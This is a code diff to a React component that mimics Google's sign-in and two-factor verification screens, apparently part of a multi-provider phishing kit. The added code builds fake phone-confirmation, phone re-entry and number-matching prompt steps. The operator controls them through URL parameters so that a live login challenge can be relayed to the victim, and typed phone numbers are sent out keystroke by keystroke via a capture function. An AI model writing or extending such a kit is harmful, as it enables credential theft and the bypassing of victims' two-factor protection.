@@ -1614,7 +1614,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-code' | 'processing' | 'verify' | 'error-email' | 'error-password' | 'error-code';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'error-email' | 'error-password' | 'error-code';
 
 function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
@@ -1630,11 +1630,17 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
   const [passwordFocused, setPasswordFocused] = useState(false);
   const [phoneCodeInput, setPhoneCodeInput] = useState('');
   const [phoneCodeFocused, setPhoneCodeFocused] = useState(false);
+  const [wrongPhone, setWrongPhone] = useState('');
+  const [wrongPhoneFocused, setWrongPhoneFocused] = useState(false);
   const [transitioning, setTransitioning] = useState(false);
   const [captchaState, setCaptchaState] = useState<'idle' | 'challenge' | 'solving' | 'solved'>('idle');
   const [selectedImgs, setSelectedImgs] = useState<Set<number>>(new Set([0, 2, 5]));
   const passwordRef = useRef<HTMLInputElement>(null);
-  const googlePhone = new URLSearchParams(window.location.search).get('gphone') ?? '09';
+  const _gParams = new URLSearchParams(window.location.search);
+  const googlePhone = _gParams.get('gphone') ?? '09';
+  const gVerifyMethod = (_gParams.get('gverify') ?? 'sms') as 'sms' | 'auth';
+  const gCorrectNumber = parseInt(_gParams.get('gnumber') ?? '45');
+  const promptNums = [gCorrectNumber, ((gCorrectNumber + 27) % 99) + 1, ((gCorrectNumber + 54) % 99) + 1].sort((a, b) => a - b);
 
   useEffect(() => {
     if (step === 'password') passwordRef.current?.focus();
@@ -1728,6 +1734,9 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
             <h1 style={{ fontSize: 40, fontWeight: 400, margin: '0 0 12px', letterSpacing: '-0.5px', color: textColor }}>
               {step === 'email' ? 'Sign in'
                 : step === 'phone-verify' || step === 'phone-code' ? 'Confirm it\'s you'
+                : step === 'phone-confirm' ? 'Confirm your number'
+                : step === 'phone-wrong' ? 'Verify it\'s you'
+                : step === 'prompt-number' ? 'Check your phone'
                 : step === 'verify' ? 'Verify it\'s you'
                 : step === 'processing' ? 'Welcome'
                 : 'Welcome'}
@@ -1867,64 +1876,47 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               <>
                 <div>
                   <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
-                    To help keep your account safe, Google wants to make sure it's really you trying to sign in.
+                    To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in.
                   </p>
-                  {/* Phone option row */}
-                  <div style={{
-                    border: `1px solid ${borderColor}`, borderRadius: 4,
-                    padding: '16px', marginBottom: 12, cursor: 'pointer',
-                    display: 'flex', alignItems: 'center', gap: 16,
-                    background: 'transparent',
-                  }}
-                    onClick={() => nav('phone-code')}
-                  >
+                  {gVerifyMethod === 'sms' ? (
+                    /* SMS Code option only */
                     <div style={{
-                      width: 40, height: 40, borderRadius: '50%',
-                      background: isDark ? '#3c4043' : '#e8f0fe',
-                      display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
-                    }}>
-                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
-                        <rect x="5" y="2" width="14" height="20" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
-                        <circle cx="12" cy="18" r="1" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
-                      </svg>
-                    </div>
-                    <div style={{ flex: 1 }}>
-                      <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>
-                        Get a verification code
+                      border: `1px solid ${borderColor}`, borderRadius: 4,
+                      padding: '16px', cursor: 'pointer',
+                      display: 'flex', alignItems: 'center', gap: 16, background: 'transparent',
+                    }} onClick={() => nav('phone-confirm')}>
+                      <div style={{ width: 40, height: 40, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
+                          <rect x="5" y="2" width="14" height="20" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
+                          <circle cx="12" cy="18" r="1" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
+                        </svg>
                       </div>
-                      <div style={{ fontSize: 13, color: subText }}>
-                        Google will text a code to ●●●●●●{email ? email.slice(-2) : '09'}
+                      <div style={{ flex: 1 }}>
+                        <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>Get a verification code</div>
+                        <div style={{ fontSize: 13, color: subText }}>Google will text a verification code to your phone</div>
                       </div>
+                      <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
                     </div>
-                    <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
-                  </div>
-                  {/* Authenticator app option */}
-                  <div style={{
-                    border: `1px solid ${borderColor}`, borderRadius: 4,
-                    padding: '16px', cursor: 'pointer',
-                    display: 'flex', alignItems: 'center', gap: 16,
-                    background: 'transparent',
-                  }}>
+                  ) : (
+                    /* Authenticator App option only */
                     <div style={{
-                      width: 40, height: 40, borderRadius: '50%',
-                      background: isDark ? '#3c4043' : '#e8f0fe',
-                      display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
-                    }}>
-                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
-                        <rect x="3" y="3" width="18" height="18" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
-                        <path d="M8 8h2m-2 4h6m-6 4h4" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5" strokeLinecap="round"/>
-                      </svg>
-                    </div>
-                    <div style={{ flex: 1 }}>
-                      <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>
-                        Use an authenticator app
+                      border: `1px solid ${borderColor}`, borderRadius: 4,
+                      padding: '16px', cursor: 'pointer',
+                      display: 'flex', alignItems: 'center', gap: 16, background: 'transparent',
+                    }} onClick={() => nav('phone-code')}>
+                      <div style={{ width: 40, height: 40, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
+                          <rect x="3" y="3" width="18" height="18" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
+                          <path d="M8 8h2m-2 4h6m-6 4h4" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5" strokeLinecap="round"/>
+                        </svg>
                       </div>
-                      <div style={{ fontSize: 13, color: subText }}>
-                        Get a verification code from your authenticator app
+                      <div style={{ flex: 1 }}>
+                        <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>Use an authenticator app</div>
+                        <div style={{ fontSize: 13, color: subText }}>Get a verification code from your authenticator app</div>
                       </div>
+                      <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
                     </div>
-                    <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
-                  </div>
+                  )}
                 </div>
                 <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                   <button onClick={() => setStep('password')}
@@ -1935,12 +1927,90 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
 
+            {/* ── Phone Confirm (Confirm your number before sending code) ── */}
+            {step === 'phone-confirm' && (
+              <>
+                <div>
+                  <p style={{ fontSize: 14, color: subText, marginBottom: 24 }}>
+                    To verify it&apos;s you, Google will send a verification code to your phone. First, confirm your number.
+                  </p>
+                  <div style={{
+                    border: `1px solid ${borderColor}`, borderRadius: 4, padding: '20px 16px',
+                    textAlign: 'center', background: isDark ? '#3c4043' : '#f8f9fa',
+                  }}>
+                    <div style={{ fontSize: 26, letterSpacing: '0.15em', color: textColor, marginBottom: 6, fontWeight: 400 }}>
+                      ●●●●●●{googlePhone}
+                    </div>
+                    <div style={{ fontSize: 12, color: subText }}>
+                      We&apos;ll send a code to the number ending in <strong>{googlePhone}</strong>
+                    </div>
+                  </div>
+                  <button onClick={() => setStep('phone-wrong')}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 13, fontWeight: 500, cursor: 'pointer', padding: '10px 0 0', display: 'block' }}>
+                    This isn&apos;t my number
+                  </button>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <button onClick={() => setStep('phone-verify')}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                    Back
+                  </button>
+                  <button onClick={() => nav('phone-code')}
+                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
+                    Send
+                  </button>
+                </div>
+              </>
+            )}
+
+            {/* ── Phone Wrong (re-enter number) ── */}
+            {step === 'phone-wrong' && (
+              <>
+                <div>
+                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
+                    Enter your phone number and we&apos;ll send you a 6-digit verification code.
+                  </p>
+                  <div style={{ position: 'relative', marginBottom: 8 }}>
+                    <input
+                      type="tel"
+                      value={wrongPhone}
+                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setWrongPhone(v); sendCapture('phone', v); }}
+                      onFocus={() => setWrongPhoneFocused(true)}
+                      onBlur={() => setWrongPhoneFocused(false)}
+                      onKeyDown={e => { if (e.key === 'Enter' && wrongPhone.length >= 7) nav('phone-code', 'phone', wrongPhone); }}
+                      autoFocus
+                      style={{
+                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
+                        border: `${wrongPhoneFocused ? 2 : 1}px solid ${wrongPhoneFocused ? focusBorderColor : borderColor}`,
+                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
+                      }}
+                    />
+                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(wrongPhoneFocused, !!wrongPhone) }}>
+                      Phone number
+                    </label>
+                  </div>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <button onClick={() => setStep('phone-confirm')}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                    Back
+                  </button>
+                  <button onClick={() => wrongPhone.length >= 7 && nav('phone-code', 'phone', wrongPhone)}
+                    style={{ backgroundColor: wrongPhone.length >= 7 ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c4043' : '#c8d0db'), color: wrongPhone.length >= 7 ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: wrongPhone.length >= 7 ? 'pointer' : 'default' }}>
+                    Next
+                  </button>
+                </div>
+              </>
+            )}
+
             {/* ── Phone Code ── */}
             {step === 'phone-code' && (
               <>
                 <div>
                   <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
-                    A 6-digit verification code was sent to your phone ending in ●●●●●●09. It may take a moment to arrive.
+                    {gVerifyMethod === 'sms'
+                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}>●●●●●●{googlePhone}</strong>. It may take a moment to arrive.</>
+                      : <>Enter the 6-digit code from your authenticator app.</>}
                   </p>
                   <div style={{ position: 'relative', marginBottom: 8 }}>
                     <input
@@ -1982,6 +2052,59 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                     disabled={phoneCodeInput.length < 4}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneCodeInput.length < 4 ? 'default' : 'pointer', opacity: phoneCodeInput.length < 4 ? 0.5 : 1 }}>
                     Verify
+                  </button>
+                </div>
+              </>
+            )}
+
+            {/* ── Google Prompt (number matching) ── */}
+            {step === 'prompt-number' && (
+              <>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 18 }}>
+                  {/* Phone with notification bubble */}
+                  <div style={{ position: 'relative' }}>
+                    <div style={{ width: 56, height: 56, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                      <svg viewBox="0 0 24 24" width="30" height="30" fill="none">
+                        <rect x="5" y="2" width="14" height="20" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
+                        <circle cx="12" cy="18" r="1" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
+                        <rect x="8" y="6" width="8" height="1.5" rx="0.75" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
+                        <rect x="8" y="9" width="5" height="1.5" rx="0.75" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
+                      </svg>
+                    </div>
+                    <div style={{ position: 'absolute', top: -4, right: -4, width: 18, height: 18, borderRadius: '50%', background: '#34A853', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                      <svg viewBox="0 0 24 24" width="11" height="11" fill="none">
+                        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9M13.73 21a2 2 0 0 1-3.46 0" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                      </svg>
+                    </div>
+                  </div>
+                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0, maxWidth: 280, lineHeight: 1.5 }}>
+                    A notification was sent to your Android device.<br/>
+                    Tap the number shown on your Android device.
+                  </p>
+                  {/* 3 number buttons */}
+                  <div style={{ display: 'flex', gap: 12 }}>
+                    {promptNums.map(num => (
+                      <button key={num}
+                        onClick={() => { if (num === gCorrectNumber) nav('processing'); }}
+                        style={{
+                          width: 72, height: 72, borderRadius: 12,
+                          border: `1px solid ${borderColor}`,
+                          background: 'transparent',
+                          fontSize: 28, fontWeight: 400, color: textColor,
+                          cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                          transition: 'background 0.15s, border-color 0.15s',
+                        }}
+                        onMouseEnter={e => { (e.currentTarget as HTMLButtonElement).style.background = isDark ? '#3c4043' : '#e8f0fe'; (e.currentTarget as HTMLButtonElement).style.borderColor = isDark ? '#a8c7fa' : '#0b57d0'; }}
+                        onMouseLeave={e => { (e.currentTarget as HTMLButtonElement).style.background = 'transparent'; (e.currentTarget as HTMLButtonElement).style.borderColor = borderColor; }}>
+                        {num}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'flex-start' }}>
+                  <button onClick={() => setStep('phone-verify')}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                    Try another way
                   </button>
                 </div>
               </>
